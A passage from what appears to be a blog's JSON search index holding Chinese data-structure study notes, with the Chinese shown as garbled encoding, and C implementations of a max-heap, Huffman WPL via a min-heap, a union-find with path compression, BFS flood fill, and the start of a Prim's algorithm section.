äº†ä¸€ä¸ªæŒ‡å‘å…„å¼Ÿçš„æŒ‡é’ˆã€‚å¹¶ä¸”æ¯ä¸ªç»“ç‚¹çš„å…³é”®å­—ä¸ªæ•°è‡³å°‘ä¸ºå…³é”®å­—ä¸ªæ•°ä¸Šé™çš„ \\(\\frac{2}{3}\\)ã€‚å› ä¸ºå¯¹ä¸‹é™çš„è°ƒæ•´ï¼Œæ‰€ä»¥ B * æ ‘çš„ç©ºé—´ä½¿ç”¨ç‡æ¯” B æ ‘å’Œ B+ æ ‘æ›´é«˜ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"}],"tags":[{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"}],"author":"HeRui"},{"title":"æ•°æ®ç»“æ„æ•´ç†-part3","slug":"æ•°æ®ç»“æ„æ•´ç†-part3","date":"2021-10-08T13:30:33.000Z","updated":"2023-08-07T11:54:31.043Z","comments":true,"path":"posts/3626ce4c.html","link":"","permalink":"https://racleray.github.io/posts/3626ce4c.html","excerpt":"å¸¸è§åŸºæœ¬æ•°æ®ç»“æ„æ•´ç†ç¬¬ä¸‰éƒ¨åˆ†ï¼Œä½¿ç”¨Cè¯­è¨€ç¼–å†™ã€‚","text":"å †ä¸ä¼˜å…ˆé˜Ÿåˆ— å †å¯ä»¥çœ‹æˆæ˜¯ä¸€æ£µå®Œå…¨äºŒå‰æ ‘ï¼Œé™¤æœ€åä¸€å±‚ä»¥å¤–ï¼Œå®ƒçš„æ¯ä¸€å±‚éƒ½æ˜¯å¡«æ»¡çš„ï¼Œæœ€åä¸€å±‚ä»å·¦åˆ°å³ä¾æ¬¡å¡«å…¥ã€‚ æ ¹ç»“ç‚¹æƒå€¼å¤§äºç­‰äºæ ‘ä¸­ä»»æ„ç»“ç‚¹æƒå€¼çš„å †ç§°ä¸ºå¤§æ ¹å †ã€‚ æ ¹ç»“ç‚¹æƒå€¼å°äºç­‰äºæ ‘ä¸­ä»»æ„ç»“ç‚¹æƒå€¼çš„å †åˆ™ç§°ä¸ºå°æ ¹å †ã€‚ å¹¶ä¸éœ€è¦çœŸçš„ç»´æŠ¤ä¸€æ£µå®Œå…¨äºŒå‰æ ‘ï¼Œè€Œåªéœ€ç”¨ä¸€ä¸ªæ•°ç»„æ¥å­˜å‚¨ï¼Œå †æŒ‰ä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³çš„é¡ºåºï¼Œä¾æ¬¡å­˜å‚¨åœ¨ä¸‹æ ‡ä» 1 å¼€å§‹çš„æ•°ç»„é‡Œã€‚ å…ƒç´ æ’å…¥ï¼Œå…ˆæ·»åŠ åˆ°å®Œå…¨äºŒå‰æ ‘çš„æœ€åä¸€ä½ä¹‹åï¼Œç„¶åå¯¹æ¯”ä¸çˆ¶èŠ‚ç‚¹çš„å…³ç³»ï¼Œåˆ¤æ–­æ˜¯å¦äº¤æ¢ä¸çˆ¶èŠ‚ç‚¹çš„ä½ç½®ã€‚ å…ƒç´ åˆ é™¤ï¼Œå…ˆå¯¹è°ƒå †é¡¶å…ƒç´ ä¸å®Œå…¨äºŒå‰æ ‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œåˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ ï¼Œç„¶åä»å †é¡¶å¼€å§‹è°ƒæ•´äºŒå‰æ ‘çš„å †åºæ€§ã€‚ å †æ’åºï¼Œå’Œå…ƒç´ åˆ é™¤ç±»ä¼¼ï¼Œåªæ˜¯ä¸åˆ é™¤å¯¹è°ƒä¹‹åçš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œåªæ˜¯å°†åºåˆ—å°¾éƒ¨ index å‡ä¸€ã€‚ç›´åˆ° index ç­‰äº 0ã€‚ æ€»è€Œè¨€ä¹‹ï¼ŒæŒºç®€å•çš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Heap &#123; int *data, size;&#125; Heap;void init(Heap *h, int length_input) &#123; h-&gt;data = (int *)malloc(sizeof(int) * length_input); h-&gt;size = 0;&#125;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void push(Heap *h, int value) &#123; h-&gt;data[h-&gt;size] = value; int cur = h-&gt;size; int parent = (cur - 1) / 2; while (h-&gt;data[cur] &gt; h-&gt;data[parent]) &#123; swap(&amp;h-&gt;data[cur], &amp;h-&gt;data[parent]); cur = parent; parent = (cur - 1) / 2; &#125; h-&gt;size++;&#125;void output(Heap *h) &#123; for (int i = 0; i &lt; h-&gt;size; i++) &#123; (i &gt; 0) &amp;&amp; printf(\" \"); printf(\"%d \", h-&gt;data[i]); &#125; printf(\"\\n\");&#125;int top(Heap *h) &#123; return h-&gt;data[0];&#125;void update(Heap *h, int pos, int n) &#123; int lchild = 2 * pos + 1, rchild = 2 * pos + 2; int max_idx = pos; if (h-&gt;data[lchild] &gt; h-&gt;data[max_idx] &amp;&amp; lchild &lt; n) max_idx = lchild; if (rchild &lt; n &amp;&amp; h-&gt;data[rchild] &gt; h-&gt;data[max_idx]) max_idx = rchild; if (max_idx != pos) &#123; swap(&amp;h-&gt;data[max_idx], &amp;h-&gt;data[pos]); update(h, max_idx, n); &#125; return;&#125;void pop(Heap *h) &#123; swap(&amp;h-&gt;data[0], &amp;h-&gt;data[--h-&gt;size]); update(h, 0, h-&gt;size);&#125;void heap_sort(Heap *h) &#123; for (int i = h-&gt;size - 1; i &gt; 0; i--) &#123; swap(&amp;h-&gt;data[i], &amp;h-&gt;data[0]); update(h, 0, i); &#125;&#125;void clear(Heap *h) &#123; free(h-&gt;data); free(h);&#125;int main() &#123; Heap *h = (Heap *)malloc(sizeof(Heap)); init(h, 105); int n; scanf(\"%d\", &amp;n); for (int i = 0, val; i &lt; n; i++) &#123; scanf(\"%d\", &amp;val); push(h, val); &#125; int m; scanf(\"%d\", &amp;m); while (m--) &#123; printf(\"%d\\n\", top(h)); pop(h); &#125; output(h); heap_sort(h); output(h); clear(h); return 0;&#125; ä¼˜å…ˆé˜Ÿåˆ— åœ¨ C++ çš„ STL é‡Œï¼Œæœ‰å°è£…å¥½çš„ä¼˜å…ˆé˜Ÿåˆ—priority_queueï¼Œå®ƒåŒ…å«åœ¨å¤´æ–‡ä»¶&lt;queue&gt;é‡Œã€‚ä¼˜å…ˆçº§å¯ä»¥è‡ªå·±å®šä¹‰ï¼Œé»˜è®¤ä¼˜å…ˆçº§æ˜¯æƒå€¼å¤§çš„å…ƒç´ ä¼˜å…ˆçº§é«˜ã€‚ å­—ç¬¦ä¸²Huffmanç¼–ç  å»ºç«‹Huffmanæ ‘çš„æ–¹æ³•ï¼Œåœ¨æ€»ç»“ æ ‘ çš„éƒ¨åˆ†æœ‰è¯´æ˜ã€‚ é¦–å…ˆç»Ÿè®¡æ¯ä¸ªå­—æ¯åœ¨å­—ç¬¦ä¸²é‡Œå‡ºç°çš„é¢‘ç‡ï¼ŒæŠŠæ¯ä¸ªå­—æ¯çœ‹æˆä¸€ä¸ªç»“ç‚¹ï¼Œç»“ç‚¹çš„æƒå€¼å³æ˜¯å­—æ¯å‡ºç°çš„é¢‘ç‡ã€‚ æŠŠæ¯ä¸ªç»“ç‚¹çœ‹æˆä¸€æ£µåªæœ‰æ ¹ç»“ç‚¹çš„äºŒå‰æ ‘ï¼Œä¸€å¼€å§‹æŠŠæ‰€æœ‰äºŒå‰æ ‘ï¼ˆç»“ç‚¹ï¼‰éƒ½æ”¾åœ¨ä¸€ä¸ªé›†åˆé‡Œï¼Œæ¥ä¸‹æ¥å¼€å§‹å¦‚ä¸‹ç¼–ç ï¼š æ­¥éª¤ä¸€ï¼šä»é›†åˆé‡Œå–å‡ºä¸¤ä¸ªæ ¹ç»“ç‚¹æƒå€¼æœ€å°çš„æ ‘aå’Œbï¼Œæ„é€ å‡ºä¸€æ£µæ–°çš„äºŒå‰æ ‘cï¼ŒäºŒå‰æ ‘cçš„æ ¹ç»“ç‚¹çš„æƒå€¼ä¸ºaå’Œbçš„æ ¹ç»“ç‚¹æƒå€¼å’Œï¼ŒäºŒå‰æ ‘cçš„å·¦å³å­æ ‘åˆ†åˆ«æ˜¯aå’Œbã€‚ï¼ˆåˆå¹¶ï¼‰ æ­¥éª¤äºŒï¼šå°†äºŒå‰æ ‘aå’Œbä»é›†åˆé‡Œåˆ é™¤ï¼ŒæŠŠäºŒå‰æ ‘cåŠ å…¥é›†åˆé‡Œã€‚ï¼ˆæ›´æ–°å€™é€‰ï¼‰ é‡å¤ä»¥ä¸Šä¸¤ä¸ªæ­¥éª¤ï¼Œç›´åˆ°é›†åˆé‡Œåªå‰©ä¸‹ä¸€æ£µäºŒå‰æ ‘ï¼Œæœ€åå‰©ä¸‹çš„å°±æ˜¯å“ˆå¤«æ›¼æ ‘äº†ã€‚ è§„å®šæ¯ä¸ªæœ‰å­©å­çš„ç»“ç‚¹ï¼Œåˆ°å·¦å­©å­çš„è·¯å¾„ä¸º 0ï¼Œåˆ°å³å­©å­çš„è·¯å¾„ä¸º 1ã€‚æ¯ä¸ªå­—æ¯çš„ç¼–ç å°±æ˜¯æ ¹ç»“ç‚¹åˆ°å­—æ¯å¯¹åº”ç»“ç‚¹çš„è·¯å¾„ã€‚ è®¡ç®—å­—ç¬¦ä¸²è¿›è¡Œå“ˆå¤«æ›¼ç¼–ç åçš„é•¿åº¦ï¼Œå³å“ˆå¤«æ›¼æ ‘çš„å¸¦æƒè·¯å¾„é•¿åº¦ WPLï¼ˆWeighted Path Lengthï¼‰ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªå¶å­ç»“ç‚¹åˆ°æ ¹ç»“ç‚¹çš„è·ç¦»ä¹˜ä»¥å¶å­ç»“ç‚¹æƒå€¼ç»“æœä¹‹å’Œã€‚ ä¸€ç§ç®€å•çš„è®¡ç®—æ–¹æ³•æ˜¯ï¼šå½“å“ˆå¤«æ›¼æ ‘ä¸Šç»“ç‚¹æ€»ä¸ªæ•°å¤§äº 1 æ—¶ï¼Œå“ˆå¤«æ›¼æ ‘çš„ WPLï¼Œç­‰äºæ ‘ä¸Šé™¤æ ¹ç»“ç‚¹ä¹‹å¤–çš„æ‰€æœ‰ç»“ç‚¹çš„æƒå€¼ä¹‹å’Œã€‚å¦‚æœç»“ç‚¹æ€»ä¸ªæ•°ä¸º 1ï¼Œåˆ™å“ˆå¤«æ›¼æ ‘çš„ WPL å³ä¸ºæ ¹ç»“ç‚¹æƒå€¼ã€‚ æƒ³æƒ³Huffmanæ ‘å»ºç«‹çš„è¿‡ç¨‹ï¼Œè¿™ç§ç®€å•çš„è®¡ç®—WPLçš„æ–¹æ³•ï¼ŒæŒºç›´è§‚çš„ã€‚ åˆ©ç”¨å°æ ¹å †è®¡ç®—Huffmanæ ‘çš„WPL ä¸è€ƒè™‘å»ºç«‹äºŒå‰æ ‘çš„æ­¥éª¤ï¼Œåªç´¯åŠ è®¡ç®—æ¯æ¬¡ä½œä¸ºæ’å…¥ç»“ç‚¹çš„æƒå€¼ä¹‹å’Œå°±èƒ½å¾—åˆ°ç»“æœã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Heap &#123; int *data, size;&#125; Heap;void init(Heap *h, int length_input) &#123; h-&gt;data = (int *)malloc(sizeof(int) * length_input); h-&gt;size = 0;&#125;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void push(Heap *h, int value) &#123; h-&gt;data[h-&gt;size] = value; int current = h-&gt;size; int father = (current - 1) / 2; while (h-&gt;data[current] &lt; h-&gt;data[father]) &#123; swap(&amp;h-&gt;data[current], &amp;h-&gt;data[father]); current = father; father = (current - 1) / 2; &#125; h-&gt;size++;&#125;int top(Heap *h) &#123; return h-&gt;data[0];&#125;void update(Heap *h, int pos, int n) &#123; int lchild = 2 * pos + 1, rchild = 2 * pos + 2; int max_value = pos; if (lchild &lt; n &amp;&amp; h-&gt;data[lchild] &lt; h-&gt;data[max_value]) &#123; max_value = lchild; &#125; if (rchild &lt; n &amp;&amp; h-&gt;data[rchild] &lt; h-&gt;data[max_value]) &#123; max_value = rchild; &#125; if (max_value != pos) &#123; swap(&amp;h-&gt;data[pos], &amp;h-&gt;data[max_value]); update(h, max_value, n); &#125;&#125;void pop(Heap *h) &#123; swap(&amp;h-&gt;data[0], &amp;h-&gt;data[h-&gt;size - 1]); h-&gt;size--; update(h, 0, h-&gt;size);&#125;int heap_size(Heap *h) &#123; return h-&gt;size;&#125;void clear(Heap *h) &#123; free(h-&gt;data); free(h);&#125;int main() &#123; int n, value, ans = 0; scanf(\"%d\", &amp;n); Heap *heap = (Heap *)malloc(sizeof(Heap)); init(heap, n); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;value); push(heap, value); &#125; if (n == 1) &#123; ans = ans + top(heap); &#125; while (heap_size(heap) &gt; 1) &#123; int a = top(heap); pop(heap); int b = top(heap); pop(heap); ans = ans + a + b; push(heap, a + b); &#125; printf(\"%d\\n\", ans); clear(heap); return 0;&#125; å¹¶æŸ¥é›† åœ¨æ•°æ®ç»“æ„é‡Œï¼Œæ£®æ—æ˜¯æŒ‡è‹¥å¹²æ£µäº’ä¸ç›¸äº¤çš„æ ‘çš„é›†åˆã€‚ å¹¶æŸ¥é›†ï¼ˆMerge-Find Setï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸ºä¸ç›¸äº¤é›†åˆï¼ˆDisjoint Setï¼‰ï¼Œæ˜¯ç”¨äºè§£å†³è‹¥å¹²çš„ä¸ç›¸äº¤é›†åˆæ£€ç´¢å…³ç³»çš„æ•°æ®ç»“æ„ã€‚ ä¸€èˆ¬å¹¶æŸ¥é›†æœ‰ä»¥ä¸‹å‡ ç§æ“ä½œï¼š MAKE-SET(x)ï¼šåˆå§‹åŒ–æ“ä½œï¼Œå»ºç«‹ä¸€ä¸ªåªåŒ…å«å…ƒç´  x çš„é›†åˆã€‚ UNION(x, y)ï¼šåˆå¹¶æ“ä½œï¼Œå°†åŒ…å« x å’Œ y çš„é›†åˆåˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„é›†åˆã€‚ FIND-SET(x)ï¼šæŸ¥è¯¢æ“ä½œï¼Œè®¡ç®— x æ‰€åœ¨çš„é›†åˆã€‚ â€œå¹¶æŸ¥é›†â€è¿™ä¸ªè¯é€šå¸¸æ—¢å¯ä»¥æŒ‡ä»£ä¸ç›¸äº¤é›†åˆçš„æ•°æ®ç»“æ„ï¼Œä¹Ÿå¯ä»¥è¡¨ç¤ºå…¶å¯¹åº”çš„ç®—æ³•ã€‚å…¶åœ¨æœ‰äº›æ•™æä¸­çš„è‹±æ–‡åç§°ä¹Ÿå«åš Disjoint Set Unionï¼Œè¡¨ç¤ºç”¨äºæ±‚ä¸ç›¸äº¤é›†åˆå¹¶é›†çš„ç›¸å…³ç®—æ³•ã€‚ å¹¶æŸ¥é›†ç”¨æœ‰æ ¹æ ‘æ¥è¡¨ç¤ºé›†åˆï¼Œæ ‘ä¸­çš„æ¯ä¸€ä¸ªç»“ç‚¹éƒ½å¯¹åº”é›†åˆçš„ä¸€ä¸ªæˆå‘˜ï¼Œæ¯æ£µæ ‘è¡¨ç¤ºä¸€ä¸ªé›†åˆã€‚ æ¯ä¸ªæˆå‘˜éƒ½æœ‰ä¸€æ¡æŒ‡å‘çˆ¶ç»“ç‚¹çš„è¾¹ï¼Œæ•´ä¸ªæœ‰æ ¹æ ‘é€šè¿‡è¿™äº›æŒ‡å‘çˆ¶ç»“ç‚¹çš„è¾¹æ¥ç»´æŠ¤ã€‚ æ¯æ£µæ ‘çš„æ ¹å°±æ˜¯è¿™ä¸ªé›†åˆçš„ä»£è¡¨ï¼Œå¹¶ä¸”æ ¹çš„çˆ¶ç»“ç‚¹æ˜¯å®ƒè‡ªå·±ã€‚ å¹¶æŸ¥é›†çš„æŸ¥è¯¢æ“ä½œï¼ŒæŒ‡çš„æ˜¯æŸ¥æ‰¾å‡ºæŒ‡å®šå…ƒç´ æ‰€åœ¨æœ‰æ ¹æ ‘çš„æ ¹ç»“ç‚¹æ˜¯è°ã€‚ å¹¶æŸ¥é›†çš„åˆå¹¶æ“ä½œéœ€è¦ç”¨åˆ°æŸ¥è¯¢æ“ä½œçš„ç»“æœã€‚åˆå¹¶ä¸¤ä¸ªå…ƒç´ æ‰€åœ¨çš„é›†åˆï¼Œéœ€è¦é¦–å…ˆæ±‚å‡ºä¸¤ä¸ªå…ƒç´ æ‰€åœ¨é›†åˆçš„æ ¹ã€‚æ¥ä¸‹æ¥å°†å…¶ä¸­ä¸€ä¸ªæ ¹ç»“ç‚¹çš„çˆ¶äº²è®¾ç½®ä¸ºå¦ä¸€ä¸ªæ ¹ç»“ç‚¹ã€‚ ä¼˜åŒ–æ–¹æ³• å¹¶æŸ¥é›†çš„æŸ¥è¯¢æ“ä½œæœ€åæƒ…å†µä¸‹çš„æ—¶é—´å¤æ‚åº¦ä¸º \\(O(n)\\) é€€åŒ–æˆä¸€ä¸ªå•é“¾è¡¨ã€‚ å…¶ä¼˜åŒ–æ–¹æ³•æ˜¯ï¼Œåœ¨åˆå¹¶æ—¶ï¼Œå°†é«˜åº¦è¾ƒä½çš„æ ‘æ¥åˆ°é«˜åº¦è¾ƒé«˜çš„æ ‘æ ¹ä¸Šï¼Œå¯ä»¥é˜²æ­¢æ ‘é€€åŒ–æˆä¸€æ¡é“¾ã€‚ åˆ©ç”¨ä¸€ä¸ªæ•°ç»„ä¿å­˜æ¯ä¸ªèŠ‚ç‚¹çš„æ‰€åœ¨æ ‘çš„èŠ‚ç‚¹æ€»æ•°ï¼Œå³ä¿å­˜æ¯ä¸ªèŠ‚ç‚¹çš„ç§©ï¼ˆå¯è§†ä¸ºheightï¼‰ã€‚ åˆ†åˆ«è·å¾—ä¼ å…¥çš„ä¸¤ä¸ªèŠ‚ç‚¹æ‰€åœ¨çš„æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ æ¯”è¾ƒä¸¤ä¸ªæ ¹èŠ‚ç‚¹æ˜¯å¦ï¼Œç›¸åŒåˆ™è¿”å› falseï¼Œç»“æŸåˆå¹¶æ“ä½œã€ è‹¥ä¸¤ä¸ªæ ¹èŠ‚ç‚¹çš„ç§©ä¸åŒï¼Œæ¯”è¾ƒä»–ä»¬çš„ç§©çš„å¤§å°ã€‚ å°†ç§©è¾ƒå°çš„æ ¹èŠ‚ç‚¹çš„çˆ¶æŒ‡é’ˆæŒ‡å‘ç§©è¾ƒå¤§çš„è·ŸèŠ‚ç‚¹ã€‚ æ›´æ–°åˆå¹¶åçš„æ ¹èŠ‚ç‚¹çš„ç§©ï¼Œè¿”å› trueï¼Œç»“æŸåˆå¹¶æ“ä½œã€‚ é€šè¿‡è·¯å¾„å‹ç¼©çš„æ–¹æ³•å¯ä»¥è¿›ä¸€æ­¥å‡å°‘å‡æ‘Šå¤æ‚åº¦ï¼Œæ­¤æ—¶åŒä¸€ä¸ªé›†åˆå†…çš„èŠ‚ç‚¹å¯ä»¥ä¸€æ­¥æ‰¾åˆ°æ ¹èŠ‚ç‚¹ã€‚åŒæ—¶ä½¿ç”¨è¿™ä¸¤ç§ä¼˜åŒ–æ–¹æ³•ï¼Œå¯ä»¥å°†æ¯æ¬¡æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¼˜åŒ–è‡³æ¥è¿‘å¸¸æ•°çº§ã€‚ è·¯å¾„å‹ç¼©æŒ‡ï¼Œåœ¨è¿›è¡Œè·¯å¾„å‹ç¼©ä¼˜åŒ–æ—¶åªéœ€åœ¨æŸ¥æ‰¾æ ¹èŠ‚ç‚¹æ—¶ï¼Œå°†å¾…æŸ¥æ‰¾çš„èŠ‚ç‚¹çš„çˆ¶æŒ‡é’ˆæŒ‡å‘å®ƒæ‰€åœ¨çš„æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct DisjointSet&#123; int *father, *rank;&#125; DisjointSet;void init(DisjointSet *s, int size) &#123; s-&gt;father = (int *)malloc(sizeof(int) * size); s-&gt;rank = (int *)malloc(sizeof(int) * size); for (int i = 0; i &lt; size; ++i) &#123; s-&gt;father[i] = i; s-&gt;rank[i] = 1; &#125;&#125;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;int max(int a, int b) &#123; return a &gt; b ? a : b;&#125;int find_set(DisjointSet *s, int node) &#123; if (s-&gt;father[node] != node) &#123; // é€’å½’æ‰¾åˆ°æ ¹èŠ‚ç‚¹ï¼Œnodeçš„fatheræŒ‡å‘æ ¹èŠ‚ç‚¹ s-&gt;father[node] = find_set(s, s-&gt;father[node]); &#125; // å›æº¯è¿‡ç¨‹ä¸­ï¼Œè·¯å¾„ä¸Šnodeçš„fatheréƒ½æŒ‡å‘æ ¹ return s-&gt;father[node];&#125;// æ ¹æ®é«˜åº¦åˆå¹¶int merge(DisjointSet *s, int node1, int node2) &#123; int ancestor1 = find_set(s, node1); int ancestor2 = find_set(s, node2); if (ancestor1 != ancestor2) &#123; if (s-&gt;rank[ancestor1] &gt; s-&gt;rank[ancestor2]) &#123; swap(&amp;ancestor1, &amp;ancestor2); &#125; s-&gt;father[ancestor1] = ancestor2; s-&gt;rank[ancestor2] = max(s-&gt;rank[ancestor2], s-&gt;rank[ancestor1] + 1); return 1; &#125; return 0;&#125;void clear(DisjointSet *s) &#123; free(s-&gt;father); free(s-&gt;rank); free(s);&#125;int main() &#123; DisjointSet *dsu = (DisjointSet *)malloc(sizeof(DisjointSet)); init(dsu, 100); int m, x, y; scanf(\"%d\", &amp;m); for (int i = 0; i &lt; m; ++i) &#123; scanf(\"%d%d\", &amp;x, &amp;y); int ans = merge(dsu, x, y); if (ans) &#123; printf(\"success\\n\"); &#125; else &#123; printf(\"failed\\n\"); &#125; &#125; clear(dsu); return 0;&#125; è¿é€šåˆ†é‡ è¿é€šåˆ†é‡å°±æ˜¯å›¾ G çš„æœ€å¤§è¿é€šå­å›¾ã€‚å¯¹äºä¸€ä¸ªæ— å‘å›¾ï¼Œä½¿ç”¨FloodFillç®—æ³•å¯ä»¥æ±‚å¾—è¿é€šåˆ†é‡ã€‚ æ‰¾åˆ°ä¸€ä¸ªæ²¡æœ‰æŸ“è‰²çš„é¡¶ç‚¹ï¼Œå°†å…¶æŸ“ä¸ºæ–°çš„é¢œè‰² \\(Color_{new}\\)ï¼Œå¦‚æœæ²¡æœ‰åˆ™ç®—æ³•ç»“æŸã€‚ åˆå§‹åŒ–ä¸€ä¸ªç©ºçš„é˜Ÿåˆ—ï¼Œå¹¶å°†ç¬¬ä¸€æ­¥çš„é¡¶ç‚¹æ’å…¥é˜Ÿåˆ—ã€‚ ä¸æ–­è·å¾—é˜Ÿé¦–å…ƒç´ çš„å€¼å¹¶å¼¹å‡ºï¼Œå°†å’Œé˜Ÿé¦–å…ƒç´ ç›¸é‚»çš„æœªæŸ“è‰²é¡¶ç‚¹æŸ“ä¸º \\(Color_{new}\\)ï¼Œå¹¶å°†å…¶åŠ å…¥é˜Ÿåˆ—ã€‚ é‡å¤æ‰§è¡Œç¬¬ä¸€æ­¥ï¼Œç›´åˆ°æ‰€æœ‰é¡¶ç‚¹éƒ½è¢«æŸ“è‰²ï¼Œç®—æ³•ç»“æŸã€‚ FloodFill çš„æ—¶é—´å¤æ‚åº¦æ˜¯ \\(O(V+E)\\)ï¼Œå…¶ä¸­å¹¿åº¦ä¼˜å…ˆéå†çš„éƒ¨åˆ†å¯ä»¥æ›¿æ¢æˆæ·±åº¦ä¼˜å…ˆéå†ï¼Œå¤æ‚åº¦æ˜¯ä¸€æ ·çš„ã€‚é€šå¸¸è€ƒè™‘åˆ°é€’å½’è°ƒç”¨çš„æ—¶é—´å¼€é”€ï¼Œå¾€å¾€å¹¿åº¦ä¼˜å…ˆéå†çš„æ•ˆç‡è¦æ›´é«˜ä¸€äº›ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_N 1000typedef struct Graph &#123; int n; int color[MAX_N]; int mat[MAX_N][MAX_N];&#125; Graph;void init_Graph(Graph *g, int input_n) &#123; g-&gt;n = input_n; for (int i = 0; i &lt; g-&gt;n; i++) &#123; g-&gt;color[i] = 0; for (int j = 0; j &lt; g-&gt;n; j++) &#123; g-&gt;mat[i][j] = 0; &#125; &#125;&#125;void insert(Graph *g, int x, int y) &#123; g-&gt;mat[x][y] = 1; g-&gt;mat[y][x] = 1;&#125;void floodfill(Graph *g) &#123; int color_cnt = 0; int q[MAX_N]; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; if (g-&gt;color[i] == 0) &#123; color_cnt++; g-&gt;color[i] = color_cnt; int l = 0, r = 0; q[r++] = i; // éå†ç›¸é‚»æœªæŸ“è‰²èŠ‚ç‚¹ï¼Œé€šè¿‡é˜Ÿåˆ—ï¼Œå¹¿åº¦ä¼˜å…ˆæŸ“è‰² while (l &lt; r) &#123; int vertex = q[l++]; for (int j = 0; j &lt; g-&gt;n; j++) &#123; if (g-&gt;mat[vertex][j] &amp;&amp; g-&gt;color[j] == 0) &#123; g-&gt;color[j] = color_cnt; q[r++] = j; &#125; &#125; &#125; &#125; &#125; // output print for (int i = 0; i &lt; g-&gt;n; ++i) &#123; printf(\"%d %d\\n\", i, g-&gt;color[i]); &#125;&#125;int main() &#123; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); Graph *g = (Graph *)malloc(sizeof(Graph)); init_Graph(g, n); for (int i = 0; i &lt; m; i++) &#123; int a, b; scanf(\"%d %d\", &amp;a, &amp;b); insert(g, a, b); &#125; floodfill(g); free(g); return 0;&#125; æœ€å°ç”Ÿæˆæ ‘ ä»ä¸€ä¸ªå¸¦æƒå›¾ä¸­æŠ½å‡ºä¸€æ£µç”Ÿæˆæ ‘ï¼Œä½¿å¾—è¾¹æƒå€¼å’Œæœ€å°ï¼Œè¿™æ£µç”Ÿæˆæ ‘å°±å«åšæœ€å°ç”Ÿæˆæ ‘ã€‚ Prim æ€è·¯å¾ˆç®€å•ï¼Œä¸æ–­å¯»æ‰¾è·ç¦»å½“å‰ç”Ÿæˆæ ‘æœ€è¿‘çš„é¡¶ç‚¹ã€‚é€æ­¥æ·»åŠ æœ€çŸ­è¾¹åˆ°ç”Ÿæˆæ ‘ä¸­ã€‚ å®šä¹‰å¸¦æƒå›¾ G çš„é¡¶ç‚¹é›†åˆä¸º Vï¼Œæ¥ç€å†å®šä¹‰æœ€å°ç”Ÿæˆæ ‘çš„é¡¶ç‚¹é›†åˆä¸º Uï¼Œåˆå§‹é›†åˆ U ä¸ºç©ºã€‚ ä»»é€‰ä¸€ä¸ªé¡¶ç‚¹ \\(x\\)ï¼ŒåŠ å…¥é›†åˆ \\(U\\)ï¼Œå¹¶è®°å½•æ¯ä¸ªé¡¶ç‚¹åˆ°å½“å‰æœ€å°ç”Ÿæˆæ ‘çš„æœ€çŸ­è·ç¦»ã€‚ é€‰æ‹©ä¸€ä¸ªè·ç¦»å½“å‰æœ€å°ç”Ÿæˆæ ‘æœ€è¿‘çš„ï¼Œä¸”ä¸å±äºé›†åˆ \\(U\\) çš„é¡¶ç‚¹ \\(v\\)ï¼ˆå¦‚æœæœ‰å¤šä¸ªé¡¶ç‚¹ \\(v\\)ï¼Œä»»é€‰å…¶ä¸€ï¼‰ï¼Œå°†é¡¶ç‚¹ \\(v\\) åŠ å…¥é›†åˆ \\(U\\)ï¼Œå¹¶æ›´æ–°æ‰€æœ‰ä¸é¡¶ç‚¹ \\(v\\) ç›¸è¿çš„é¡¶ç‚¹åˆ°å½“å‰æœ€å°ç”Ÿæˆæ ‘çš„æœ€çŸ­è·ç¦»è®°å½•ã€‚ 3. é‡å¤ç¬¬äºŒæ­¥æ“ä½œï¼Œç›´è‡³é›†åˆ \\(U\\) ç­‰äºé›†åˆ \\(V\\)ã€‚ è´ªå¿ƒç­–ç•¥ï¼Œæ„å‘³ç€å°±å¾ˆç›´ç™½ï¼Œæ²¡å•¥éš¾çš„ã€‚ ä½¿ç”¨ä¸åŒçš„æ•°æ®ç»“æ„å®ç°ï¼Œæ—¶é—´å¤æ‚åº¦ä¸åŒã€‚ EXTRACT-MIN DECREASE-KEY Total array O(V) O(1) \\(O(V^2)\\) binary heap O(log V) O(log V) \\(O(E \\log V)\\) Fibonacci heap O(log V) O(1) \\(O(E + V\\log V)\\) å¯¹äºç¨ å¯†å›¾ï¼ŒEè¾¾åˆ° \\(O(V^2)\\) çº§åˆ«ï¼Œä½¿ç”¨ Fibonacci heap å®ç°çš„Primç®—æ³•æ¯”è¾ƒåˆé€‚ã€‚ ä¸‹é¢çš„å®ç°ï¼Œèµ·å§‹æœ‰ç‚¹æ¨¡ç³Šï¼ŒæŠ½è±¡äº†ä¸€ä¸ª dist æ•°ç»„ã€‚éœ€è¦åˆ°å®ç°è¿‡ç¨‹ä¸­æ‰èƒ½å‡†ç¡®åæ˜ å‡ºä»–çš„æ„ä¹‰ã€‚ä¸€ä¸ªæŠ½è±¡çš„è§£é‡Šæ˜¯ï¼Œç¬¬ i 